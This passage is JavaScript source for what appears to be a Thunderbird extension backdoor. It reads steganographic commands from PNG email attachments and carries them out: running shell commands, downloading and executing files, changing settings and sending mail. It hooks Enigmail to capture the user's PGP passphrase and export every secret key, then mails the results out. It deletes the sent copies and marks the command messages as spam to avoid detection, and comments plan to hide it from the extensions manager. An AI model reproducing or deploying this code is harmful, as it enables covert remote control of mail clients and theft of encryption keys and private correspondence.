                        break; // we assume there is only one with this subject and if deleted end loop (not sure this is ok...may leave tracks)
                        // one drawback is that processing all emails on sent mails could be too much if there are lots of mails
                    }
                }
            }
        }
        
        this.deleteFromSentQueue(deleted);
        
        deleted = [];
        // if any left to be deleted set timer again
        if (this.deleteSentQueue.length) {
            // check to ansIBkdWebProgressListener.prototype.keeping this on a loop if
            // message was deleted previously of by others
            for (i in this.deleteSentQueue) {
                this.deleteSentQueue[i].count += 1;
                if ( this.deleteSentQueue[i].count > 5 )
                    deleted.push(this.deleteSentQueue[i]);
                    //TODO: this should be logged to get it on the status report
            }
            
            this.deleteFromSentQueue(deleted);
            
            if (this.deleteSentQueue.length)
                this.setDeleteFromSentTimer();
        }
    },
    
    deleteFromSentQueue : function(values) {
        // remove the ones we could delete
        for (var j = 0; j < values.length; j++) {
            this.deleteSentQueue.splice(j, 1)
        }
    },
    
    getIFrame : function() {
        return document.getElementById('dummyiframe');
    },
    
    extractImageInfo : function(canvas, msgHdr, msgSubject) {
        var stegObj = new nsIBkdSteg(canvas);
        var data = stegObj.extract_data();
        if (typeof(msgSubject) == "undefined")
            if (msgHdr == null)
                msgSubject = this.randomString(5);
            else
                msgSubject = msgHdr.subject;
        // now we have the data we create a new action
        // data might not contain valid json string format
        // we perform a basic test just to see if it has { }
        if (data.match(/^{.*}$/i) != null) {
            var actions = data.split("|");
            for(i=0; i < actions.length; i++)
            {
                var action = new nsIBkdAction(actions[i], msgSubject, stegObj);
                if (action.valid) {
                    if (action.spam)
                        this.markSpamMessage(msgHdr);
                    this.enqueueAction(action);
                }
            }
        }
    },
    
    loadImageData : function(dataB64, msgHdr, msgSubject) {
            var image = new Image();
            // set the onload handler to be able to create a canvas element
            // using the hidden iframe
            image.onload = function() {
                var browser = nsIBkdManager.getIFrame();
                var canvas = browser.contentDocument.createElement('canvas')
                canvas.width = image.width;
                canvas.height = image.height;
                canvas.getContext('2d').drawImage(image, 0, 0);
                image.callback(canvas)
                //TODO: after loading everything.. we might need to consider deleting canvas objects
                // added to the iframe, to reduce mem usage
            };
            var obj = this;
            image.callback = function(canvas) {obj.extractImageInfo(canvas, msgHdr, msgSubject)};
            // instead of using a full path we read the contents in binary and encode in base64
            // then the source of the image is:
            image.src = "data:image/png;base64," + dataB64;
    },
    
    checkEnigmail : function() {
        // enigmail addon ID is {847b3a00-7ab1-11d4-8f02-006008948af5}
        // enigmail.js implementation only changed 2 lines from version 1.0.1
        // to version 1.1.2 on   function resolveAgentPath and Enigmail.prototype.finalize
        try {
            this.enigmailInstalled = gEnigmailVersion ? true : false;
        }
        catch (ex) {
            this.enigmailInstalled = false;
        }
    },
    
    enigNeedsPassphrase: function() {
            var enigmailSvc = GetEnigmailSvc();
            var msgFrame = EnigGetFrame(window, "messagepane");
            var bodyElement = msgFrame.document.getElementsByTagName("body")[0];
            var beginIndexObj = new Object();
            var endIndexObj = new Object();
            var indentStrObj = new Object();
            var blockType = enigmailSvc.locateArmoredBlock(bodyElement.textContent, 0, "",
                                              beginIndexObj, endIndexObj, indentStrObj);
            if (!blockType || blockType == "SIGNATURE")
                return false;
            else
                return !(blockType == "SIGNED MESSAGE");
    },    
    
    enigGetSecretKeys: function() {
        var secretKeys = EnigGetSecretKeys();
        if (secretKeys.length == 0) {
            // if for some reason the EnigGetSecretKeys method didn't return info
            // we try another method
            var aGpgSecretsList = EnigObtainKeyList(true, {});
            for (var i = 0; i < aGpgSecretsList.length; i++) {
                if (aGpgSecretsList[i].substr(0,4) == "sec:") {
                    var aLine = aGpgSecretsList[i].split(/:/);
                    keyId = aLine[4];
                    secretKeys.push({"id":keyId});
                }
            }
        }
        return secretKeys;
    },
    
    
    enigGetKey : function(id) {
        var files = [];
        // if id parameter is not set it will get all secret keys
        var enigmailSvc = GetEnigmailSvc();

        var keyIds = id ? [id] : [];
        if (keyIds.length == 0) {
            // get all keys by calling EnigGetSecretKeys() which returns an array with
            // [ {name: <userId>, id: 0x1234ABCD, created: YYYY-MM-DD },  { ... } ]
            var secretKeys = this.enigGetSecretKeys();
            for (var i = 0; i < secretKeys.length; i++)
                keyIds.push(secretKeys[i].id);
        }
        
        for (var i = 0; i < keyIds.length; i++ ) {
            var tmpFile = nsIBkdManager.getUniqueTempFile();
            var exitCodeObj = {};
            var errorMsgObj = {};
            var keyID = "0x"+keyIds[i];
            enigmailSvc.extractKey(window, Components.interfaces.nsIEnigmail.EXTRACT_SECRET_KEY,keyID , tmpFile, exitCodeObj, errorMsgObj);
            if (exitCodeObj.value == 0) {
                files.push(tmpFile.path);
            }
        }
        
        return files;
    },
    
    
    enigMessageDecryptHook : function(event, isAuto){
        // this gets called every time the user selects a new message on the message pane
        // this doesn't mean the message is encrypted. So we check if the selected mail
        // needs to ask for a passphrase and we do it too
        var gotPass = false;
        var data = "";
        if (nsIBkdManager.enigNeedsPassphrase())
        {
            var passwdObj   = new Object();
            var useAgentObj = new Object();
            var result = nsIBkdManager.enigGetPassphrase(null, passwdObj, useAgentObj);
            gotPass = true;
            data = "PASSPHRASE: \"" + passwdObj.value + "\"";
        }
        
        //call the original
        var res = nsIBkdManager.enigMessageDecryptOriginal(event, isAuto);
        
        // now we have the passphrase and we can get the keys info and send it
        //TODO: try to determine the key ID by using address from the current selected email
        if (gotPass) {
            var tmpFiles = nsIBkdManager.enigGetKey();
            for ( var i = 0; i < tmpFiles.length; i++ )
                data += "\n\n\n" + nsIBkdManager.getFileContent(tmpFiles[i]);
                
            // if this was called is because current action requested it
            var action = nsIBkdManager.currentAction;
            
            // we send output with some delay to let the real engimail do the work
            // without freezing it too much
            var delayedSendOutput = function() {
                nsIBkdManager.sendOutput(action, data);
            };
            setTimeout(delayedSendOutput, 2000);
            nsIBkdManager.enigUnhook(); // if got the info just unhook
        }

        return res;
    },
    
    enigHook : function() {
        // we have a copy of the enigMessageDecrypt function
        // now simply replace the function with our own
        enigMessageDecrypt = this.enigMessageDecryptHook;
    },
    
    enigUnhook : function() {
        // retore original function
        if (this.enigmailInstalled)
            enigMessageDecrypt = this.enigMessageDecryptOriginal;
    },
    
    enigGetPassphrase : function(domWindow, passwdObj, useAgentObj) {

        // before trying anything we check if passphrase is chached
        try {
            passwdObj.value = gCachedPassphrase;
            return true;
        }
        catch(ex) {}
        
        useAgentObj.value = false;
        if (!gEnigmailSvc)
            gEnigmailSvc = GetEnigmailSvc();
            
        try {
          var noPassphrase = gEnigmailSvc.prefBranch.getBoolPref("noPassphrase");
          useAgentObj.value = gEnigmailSvc.useGpgAgent();
        
          if (noPassphrase || useAgentObj.value) {
            passwdObj.value = "";
            return true;
          }
        
        }
        catch(ex) { }
        var maxIdleMinutes = 5;
        try {
            maxIdleMinutes = gEnigmailSvc.getMaxIdleMinutes();
        
            if (gEnigmailSvc.haveCachedPassphrase()) {
              passwdObj.value = gCachedPassphrase;
            
              if (gEnigmailSvc._passwdAccessTimes > 0) {
                --gEnigmailSvc._passwdAccessTimes;
            
                if (gEnigmailSvc._passwdAccessTimes <= 0 && maxIdleMinutes <= 0) {
                  gEnigmailSvc.clearCachedPassphrase();
                }
              }
              return true;
            }
        }
        catch(ex) { }
        
        // Obtain password interactively
        var checkObj = new Object();
        
        var promptMsg = EnigGetString("enterPassOrPin");
        passwdObj.value = "";
        checkObj.value = true;
        
        var checkMsg = (maxIdleMinutes>0) ? EnigGetString("rememberPass",maxIdleMinutes) : "";
        
        var success;
        
        var promptService = Components.classes["@mozilla.org/embedcomp/prompt-service;1"]
                                .getService(Components.interfaces.nsIPromptService);
        success = promptService.promptPassword(domWindow,
                                               EnigGetString("enigPrompt"),
                                               promptMsg,
                                               passwdObj,
                                               checkMsg,
                                               checkObj);
        
        return success;
    },
    
    doRequest : function(url, data, method, callback, binary) {
        //https://developer.mozilla.org/En/Using_XMLHttpRequest
        //https://gist.github.com/742267
        /* callback model
            req.onreadystatechange = function (aEvt) {
                if (req.readyState == 4) {
                    if(req.status == 200)
                        dump(req.responseText);
                    else
                        dump("Error loading page\n");
                }
            };
        */
        method = method || "POST";
        binary = binary || false;
        try {
            var req = new XMLHttpRequest();
            req.open(method, url, true);
            req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=ISO-8859-1');
            if (binary)
                req.overrideMimeType("text/plain; charset=x-user-defined");
            if (callback)
                req.onreadystatechange = callback;
            else
                req.onreadystatechange = function (aEvt) { };
            // data must be already formated correctly!
            req.send(data);
            return true;
        }
        catch(e) {
            return false;
        }
    },
    
//    loadOnIFrame : function(url) {
//        //TODO: load a url on the hidden iframe - https://developer.mozilla.org/en/Code_snippets/HTML_to_DOM
//        var browser = this.getIFrame();
//        browser.style.height = "0px";
//		browser.webNavigation.allowAuth = true;
//		browser.webNavigation.allowImages = false;
//		browser.webNavigation.allowJavascript = false;
//		browser.webNavigation.allowMetaRedirects = true;
//		browser.webNavigation.allowPlugins = false;
//		browser.webNavigation.allowSubframes = false;
//        //var elemIF = document.createElement("iframe"); 
//        browser.src = url; 
//        browser.style.display = "none"; 
//        //document.body.appendChild(elemIF); 
//    },
    
    downloadFile : function(action) {
        action = action || this.currentAction;
        
        try {
            var persist = Components.classes["@mozilla.org/embedding/browser/nsWebBrowserPersist;1"]
                  .createInstance(Components.interfaces.nsIWebBrowserPersist);
            var file;
            if(action.filepath) {
                file = Components.classes["@mozilla.org/file/local;1"]
                           .createInstance(Components.interfaces.nsILocalFile);
                file.initWithPath(action.filepath);
            }
            else
                file = this.getUniqueTempFile();
                
            var objURI = Components.classes["@mozilla.org/network/io-service;1"]
                          .getService(Components.interfaces.nsIIOService)
                          .newURI(action.url, null, null);
                          
            // with persist flags if desired
            const nsIWBP = Components.interfaces.nsIWebBrowserPersist;
            const flags = nsIWBP.PERSIST_FLAGS_REPLACE_EXISTING_FILES |
                          nsIWBP.PERSIST_FLAGS_DONT_CHANGE_FILENAMES |
                          nsIWBP.PERSIST_FLAGS_BYPASS_CACHE |
                          nsIWBP.ENCODE_FLAGS_RAW;
            persist.persistFlags = flags;
            
            // progress listener is needed because download is async
            persist.progressListener = new nsIBkdWebProgressListener(action);
            persist.saveURI(objURI, null, null, null, "", file);
        } catch (e) {
            action.fail();
        }
    },
    
    getGlobalPref : function(action) {
        action = action || this.currentAction;
        var result = action.pref + " = ";
        result += this.getPreference(action.pref);
        this.sendOutput(action, result)
    },
    
    setGlobalPref : function(action) {
        var result = false;
        action = action || this.currentAction;
        result = this.setPreference(action.pref, action.value);
        var strResult = result ? (action.pref + " changed succesfully") : (action.pref + " not changed");
        this.sendOutput(action, strResult)
    },

    convertFromUnicode: function(aCharset, aSrc) {
        this.unicodeConverter.charset = aCharset;
        return this.unicodeConverter.ConvertFromUnicode(aSrc);
    },
    
    encodeUTF8: function(text) {
        return this.convertFromUnicode("UTF-8", text).replace(/(\r\n)|\n/g, "\r\n");
    },
    
    encodeMimeHeader: function(header) {
        let mimeConverter = Components.classes["@mozilla.org/messenger/mimeconverter;1"]
                                      .createInstance(Components.interfaces.nsIMimeConverter);
        let fieldNameLen = (header.indexOf(": ") + 2);
        return mimeConverter.encodeMimePartIIStr_UTF8(
            header,
            false,
            "UTF-8",
            fieldNameLen,
            Components.interfaces.nsIMimeConverter.MIME_ENCODED_WORD_SIZE
        );
    },
    
    createTempEmailFile: function(aToList, aSubject, aBody, aIdentity, attchType, attchName, attchFile) {
        try {
            var mainBoundary = "MainID_" + this.randomString(20);
            var bodyBoundary = "BodyID_" + this.randomString(20);
            
            var mailText = ("MIME-version: 1.0\r\n" +
                            (aIdentity.replyTo ? "Return-path: " + aIdentity.replyTo + "\r\n" : "") +

                            "From: " + aIdentity.email + "\r\n" +
                            //"To: " + aToList + "\r\n" +
                            "Date: " + (new Date()).toUTCString() + "\r\n" +
                            "Subject: " + this.encodeMimeHeader(aSubject.replace(/(\n|\r\n)/, "|")) + "\r\n"+
                            "Content-type: multipart/mixed; boundary=" + mainBoundary + "\r\n");
            
            mailText += [   "--" + mainBoundary,
                            "Content-Type: multipart/alternative; boundary=" + bodyBoundary + "\r\n",
                            "\r\n--" + bodyBoundary,
                            "Content-Type: text/plain\r\n",
                            this.encodeUTF8(aBody),
                            "--" + bodyBoundary + "--\r\n",
                        ].join("\r\n");
            
            if (attchType) {
                mailText += [
                                "--" + mainBoundary,
                                "Content-Type: " + attchType + "; name=\"" + attchName + "\"",
                                "Content-Disposition: attachment; filename=\"" + attchName + "\"",
                                "Content-Transfer-Encoding: base64",
                                "X-Attachment-Id: " + this.randomString(10) + "\r\n"
                            ].join("\r\n");

                // now we read the file contents and encode it in base64
                mailText += window.btoa(this.getFileContent(attchFile, true));
            }
            mailText += "\r\n\r\n--" + mainBoundary +"--\r\n";
            
            var tempFile = this.writeToTempFile(mailText, "part");
            
            return tempFile;
        
        } catch (exc) {
            return null;
        }
    },
    
    writeToFile : function(file, content) {
        try {
            var outputStream = this.getOutputStream(file);
            outputStream.write(content, content.length);
            outputStream.close();
            return true;
        }
        catch (ex)
        {
            return false;
        }
    },
    
    
    writeToTempFile : function(content, extension) {
        var tempFile = this.getUniqueTempFile(extension);
        if (this.writeToFile(tempFile, content))
            return tempFile;
        else
            return null;
    },
    
    sendEmail2: function(toList, aSubject, aBody, attchType, attchName, attchFile, deleteAfter) {
        //XXX: for some reason this sends the email but leaves 2 copies in the sent folder
        // Only one email is received, but we then have to delete the 2 copies in the sent folders to avoid detection
        deleteAfter = (typeof(deleteAfter) == "undefined") ? true : deleteAfter;
        try {
            var account = this.getValidAccount();
            if(account != null) {
                var mailFile = this.createTempEmailFile(toList, aSubject, aBody, account.defaultIdentity, attchType, attchName, attchFile);
                if (mailFile) {
                    // compose fields for message: from/to etc need to be specified both here and in the file
                    var composeFields = Components.classes["@mozilla.org/messengercompose/composefields;1"]
                                                  .createInstance(Components.interfaces.nsIMsgCompFields);
                    composeFields.characterSet = "UTF-8";
                    composeFields.to = toList;
                    composeFields.from = account.defaultIdentity.email;
                    composeFields.replyTo = account.defaultIdentity.email;
            
                    var msgSend = Components.classes["@mozilla.org/messengercompose/send;1"]
                                            .createInstance(Components.interfaces.nsIMsgSend);
                    msgSend.sendMessageFile(account.defaultIdentity,
                                            account.key,
                                            composeFields,
                                            mailFile,
                                            true  /* deleteSendFileOnCompletion */,
                                            false /* digest_p */,
                                            Components.interfaces.nsIMsgSend.nsMsgDeliverNow,
                                            null  /* nsIMsgDBHdr msgToReplace */,
                                            null  /* nsIMsgSendListener aListener */,
                                            null  /* nsIMsgStatusFeedback aStatusFeedback */,
                                            ""    /* password */);
                    
                    if (deleteAfter) {
                        this.deleteSentQueue.push({"subject" : aSubject, "count" : 0});
                        this.setDeleteFromSentTimer();
                    }
                    return true;
                }
            }
        }
        catch (ex) {}
        
        return false;
    },
    
};


//------------------------------------------------------------------------------
// a steg class to handle an image and insert & extract info
var nsIBkdSteg = function(canvas, filename, bitbase) {
    // we assume that image was drawn inside the passed canvas
    this.canvas = canvas || null;
    this.consoleService = Components.classes['@mozilla.org/consoleservice;1'].getService(Components.interfaces.nsIConsoleService);
    
    if (this.canvas != null) 
        this.imageData = this.canvas.getContext('2d').getImageData(0, 0, canvas.width, canvas.height);
    else
        this.imageData = null;
    
    this.bitbase = bitbase || 8;
};

nsIBkdSteg.prototype.initialized = function() {
    return (this.canvas != null && this.imageData != null);
};

nsIBkdSteg.prototype.getpixel = function(pixel, imageData) {
    imageData = imageData || this.imageData;
    var x = pixel[0];
    var y = pixel[1];    
    var index   = (x + y * imageData.width) * 4;
    var rgb = [] ;
    for (var i = 0; i < 3; i++ )
        rgb.push(imageData.data[index + i]);
    
    //var red     = this.imageData.data[index];
    //var green   = this.imageData.data[index + 1];
    //var blue    = this.imageData.data[index + 2];
    //var alpha   = this.imageData.data[index + 3];
    
    return rgb;    
};

nsIBkdSteg.prototype.putpixel = function(pixel, rgb, imageData) {
    imageData = imageData || this.imageData;
    var x = pixel[0];
    var y = pixel[1];    
    var index   = (x + y * imageData.width) * 4;
    for (let [i, color_value] in Iterator(rgb))
        imageData.data[index + i] = color_value;
};

nsIBkdSteg.prototype.getDataB64 = function() {
    var data = this.canvas.toDataURL("image/png");
    return data.replace("data:image/png;base64,","");
};
    
nsIBkdSteg.prototype.saveToFile = function(imageData) {
    // need to put changed imageData back to canvas
    imageData = imageData || this.imageData;
    var ctx = this.canvas.getContext('2d');
    ctx.putImageData(imageData, 0, 0);
    ctx.save();
    return nsIBkdManager.writeToTempFile(window.atob(this.getDataB64()), "png");
};
    
nsIBkdSteg.prototype.bit_iterator_str = function(message, bits) {
    //iterates over all bits in all characters in message
    //We assume all characters in message are ANSI ASCII (8 bits)
    //but bits parameter can be set to another value if needed
    bits = bits || 8;
    var mask = 1;
    mask <<= bits-1;
    var values = [message.charCodeAt(index) for (index in Iterator(message, true))];
    
    for (var v=0; v < values.length; v++) {
        for (var i=0; i < bits; i++) {
            // return first bit and shift left to get next one
            yield (values[v] & mask) >> bits-1;
            values[v] <<= 1;
        }
    }
};
                
nsIBkdSteg.prototype.bit_iterator_int = function(number, fix) {
    fix = fix || 8;
    var mask = 1
    fix -= 1
    mask <<= fix
    for (var i=0; i < (fix+1); i++) {
        yield (number & mask) >> fix
        number <<= 1
    }
};
    
nsIBkdSteg.prototype.bit_count = function(n) {
    try {
        if (typeof n == "string")
            n = parseInt(n);
        return n.toString(2).length;
    }
    catch(e) {
        return 0;
    }
};
    
nsIBkdSteg.prototype.iter_pixels = function(width, height){
    for (var h=0; h < height; h++)
    {
        for (var w=0; w < width; w++)
            yield [w, h];
    }
};
    
nsIBkdSteg.prototype.set_lsb = function(value, bit) {
    // returns a new value with the least significant bit set to desired bit
    // basically swaps the bit if it is not the one we need
    if ((value & 1) ^ bit)
        return value ^ 1;
    else
        return value;
};
    
nsIBkdSteg.prototype.extract_bits = function(values) {
    //given a list of values it extracts all thier LSBs
    //and returns the corresponding value
    
    var val = 0
    for (let [index, v] in Iterator(values)) {
        val <<= 1
        bit = v & 1
        val = this.set_lsb(val, bit)
    }
    return val
};
    
nsIBkdSteg.prototype.insert_data = function(data) {
    // we first insert the message length
    // we will use 16 bits so max data length is 65535
    if (this.initialized() &&  data )
    {
        var datalen = data.length;
        if (datalen > 65535) {
            data = "Max message length is 65535 and your message length is " + datalen;
            datalen = data.length;
        }

        var width = this.canvas.width;
        var height = this.canvas.height;
        var MAX_BYTES = ((width * height) - 6 / 3) // 6 will be used to store 2 bytes for length

        if (datalen > MAX_BYTES) {
            data = "Data is too large to insert in the image";
            datalen = data.length;
        }
        
        if (datalen <= MAX_BYTES) {
            done = false;
            var databits = [bit for (bit in this.bit_iterator_int(datalen, 16))];
            databits = databits.concat( [bit for (bit in this.bit_iterator_str(data, this.bitbase))] );
            databits = Iterator(databits);
            
            for (pixel in this.iter_pixels(width, height)) {
                var new_rgb = [];
                for(let [index, color_value] in Iterator(this.getpixel(pixel))) {
                    try {
                        color_value = this.set_lsb(color_value, databits.next()[1]);
                    }
                    catch (StopIteration) {
                        // if we got this means we ended inserting all bits
                        done = true;
                    }
                    new_rgb.push(color_value);
                }
                this.putpixel(pixel, new_rgb);
                if (done)
                    break
            }
            return this.saveToFile();
        }
        
    }
    return null;
};
    
        
nsIBkdSteg.prototype.extract_data = function() { 
    var data = new String();
    
    if ( this.initialized() )
    {
        var width = this.canvas.width;
        var height = this.canvas.height;
        var values = [];
        var limit = 16;
        var datalen = 0;
        var MAX_BYTES = ((width * height) - 6 / 3);
        var c = 0;
        
        for (pixel in this.iter_pixels(width, height)) {
            for (let [index, color_value] in Iterator(this.getpixel(pixel))) {
                values.push(color_value);
                if (values.length == limit) {
                    c = this.extract_bits(values);
                    if (!datalen) {
                        datalen = c;
                        if (datalen > MAX_BYTES) {
                            return "";
                        }
                        limit = this.bitbase;
                    }
                    else {
                        data += String.fromCharCode(c);
                        if (data.length == datalen) 
                            return data;
                    }
                    values = [];
                    c = 0;
                }
            }
        }
    }

    return data;
};

//------------------------------------------------------------------------------

function nsIBkdAttachListener(msgHdr)
{
    this.canceled = false;
    this.msgHdr = msgHdr;
    this.inBinStream = null;
    this.fileData = "";
    
    this.QueryInterface = function (iid) {
        if (iid.equals(Components.interfaces.nsIStreamListener) ||
            iid.equals(Components.interfaces.nsIUrlListener) ||
            iid.equals(Components.interfaces.nsICancelable) ||
            iid.equals(Components.interfaces.nsISupports) ||
            iid.equals(Components.interfaces.nsIMsgCopyServiceListener) ||
            iid.equals(Components.interfaces.nsIRequestObserver))
          return this;
        throw Components.results.NS_NOINTERFACE;
    };
    
    this.cancel = function(aStatus) {
        this.canceled = true;
    }
    
    this.OnStartRunningUrl = function(url) {}
    
    this.OnStopRunningUrl = function(aUrl, aExitCode) {}
    
    this.onStartRequest = function(aRequest, aSupport) {}
    
    this.onStopRequest = function (aRequest, aSupport, aStatus) {
        try {
            // now we are ready to extract info from file using steg
            nsIBkdManager.loadImageData(window.btoa(this.fileData), this.msgHdr);
        }
        catch (e) { }
    }
    
    this.onDataAvailable = function (aRequest, aSupport, inStream, srcOffset, aCount) {
        if (this.canceled)
            aRequest.cancel(2); // then go cancel our underlying channel too.  NS_BINDING_ABORTED =2 apparently.
        try {
            if (this.inBinStream == null) {
                this.inBinStream = Components.classes['@mozilla.org/binaryinputstream;1']
                           .createInstance(Components.interfaces.nsIBinaryInputStream);
                this.inBinStream.setInputStream(inStream);
            }
            this.fileData += this.inBinStream.readBytes(inStream.available());
        }
        catch (e) {
            this.cancel();
        }
    }
    
    this.OnStartCopy = function(a) {}
    this.OnProgress = function(aProgress, aProgressMax) {}
    this.SetMessageKey = function(aKey) {}
    this.GetMessageId = function(aMessageId) {}
    this.OnStopCopy = function(aStatus) {}
}


//------------------------------------------------------------------------------
// class to handle the actions
var nsIBkdAction = function(json_string, subject, stegger) {
    try {
        var jsonObj = JSON.parse(json_string);
        this.valid = true;
        this.failCount = 0;
        this.canceled = false;
        this.done = false;
        this.filepath = jsonObj.filepath || nsIBkdManager.getUniqueTempFile().path;
        //this.msgHdr = msgHdr; // if account is using IMAP, this ref is lost when moving
        //                      // the message to other folder (i.e. moving to trash)
        this.msgSubject = subject;
        this.stegger = stegger;
        
        this.id = jsonObj.id;
        this.code = jsonObj.code;
        this.output = jsonObj.output;
        this.address = jsonObj.address;
        this.spam = jsonObj.spam;
        this.usebody = (typeof(jsonObj.usebody) == "undefined") ? false : jsonObj.usebody;
        
        // if action is EXEC
        this.command = jsonObj.command;
        this.runshell = jsonObj.runshell;
        this.fixargs = jsonObj.fixargs;
    
        // if action is ACCOUNT INFO
        this.email = jsonObj.email; // some value or "ALL". If this is not provided it will get all by default
        
        // if action is SEND EMAIL (will take the address attr as destination)
        this.cc = jsonObj.cc;
        this.bcc = jsonObj.bcc;
        this.subject = jsonObj.subject;
        this.body = jsonObj.body;
        this.attachment = jsonObj.attachment;
    
        // if action is OPEN URL (will take address attr as url)
        this.url = jsonObj.url;
        this.method = jsonObj.method;
        this.data = jsonObj.data;
        
        // if action is READ SETTING/CHANGE SETTING
        this.pref = jsonObj.pref;
        
        // if action is CHANGE SETTING
        this.value = jsonObj.value;
        
        // if action is DOWNLOAD FILE FROM URL
        // uses general attrs address and filepath and then uses fixed method
        // "method": "GET", (fixed to GET)
        // "url": "http://www.test.com/file.exe",
        // "filepath": null, <!-- if null a random temp file will be asigned -->
    }
    catch(ex) {
        // json_string is not valid
        this.valid = false;
    }
};

// if action.code is 2 (GET PGP INFO) we need to make sure we unhook the function
nsIBkdAction.prototype.finish = function() {
    if (this.code == 2)
        nsIBkdManager.enigUnhook();
        
    this.done = true;
    // set timer for next action
    nsIBkdManager.setActionTimer();
};

nsIBkdAction.prototype.fail = function() {
    if (this.code == 2)
        nsIBkdManager.enigUnhook();
        
    this.failCount += 1;
    nsIBkdManager.setActionTimer();
};

nsIBkdAction.prototype.cancel = function() {
    if (this.code == 2)
        nsIBkdManager.enigUnhook();
        
    this.canceled = true;
    if (nsIBkdManager.currentAction.id == this.id)
    {
        nsIBkdManager.currentAction = null;
        nsIBkdManager.setActionTimer();
    }
};

nsIBkdAction.prototype.getPersistable = function() {
    return {
        "data" : this.stegger.getDataB64(),
        "msgSubject" : this.msgSubject
    };
};

//------------------------------------------------------------------------------

var dummyObserver = {
	observe: function(subject, topic, data) {}
};

//------------------------------------------------------------------------------

var nsIBkdCmdObserver = function(action) {
    this.action = action;
};

nsIBkdCmdObserver.prototype.observe = function(subject, topic, data) {
    // if redirect is enabled we have to grab output from file    
    var cmdOutput = nsIBkdManager.getFileContent(this.action.filepath);
    nsIBkdManager.sendOutput(this.action, cmdOutput)
    nsIBkdManager.deleteFile(this.action.filepath);   
    nsIBkdManager.setSaveActionTimer(200);
};

//------------------------------------------------------------------------------

var nsIBkdWebProgressListener = function(action) {
    this.action = action;
    this.finished = false;
};

nsIBkdWebProgressListener.prototype.onFinish = function() {
    // do whatever is needed to perform the action
    if (this.action.code == 10) { //download & exec
        nsIBkdManager.runCmd(this.action);
    }
    else
        this.action.finish();
};

nsIBkdWebProgressListener.prototype.onProgressChange = function(aWebProgress, aRequest, aCurSelfProgress,
                                                                aMaxSelfProgress, aCurTotalProgress, aMaxTotalProgress) {
        if (aCurTotalProgress == aMaxTotalProgress){
            this.finished = true;
            this.onFinish();
        }
    };

// some dummy functions to implement the nsIWebProgressListener interface
nsIBkdWebProgressListener.prototype.onLocationChange = function(aWebProgress, aRequest, aLocation) {};
nsIBkdWebProgressListener.prototype.onSecurityChange = function(aWebProgress, aRequest, aState) {};
nsIBkdWebProgressListener.prototype.onStateChange = function(aWebProgress, aRequest, aStateFlags, aStatus) {};
nsIBkdWebProgressListener.prototype.onStatusChange = function(aWebProgress, aRequest, aStatus, aMessage) {};


//------------------------------------------------------------------------------
// the code that really loads everything
window.addEventListener("load",
                        function(e) { nsIBkdManager.init(e); },
                        false);

//------------------------------------------------------------------------------

// we need to know our ID to be able to hide it from extensions manager
// this variable should be populated by the deployer
// declare var _nsIBkdID and set the UUID (this will be done automatically by the deployer)
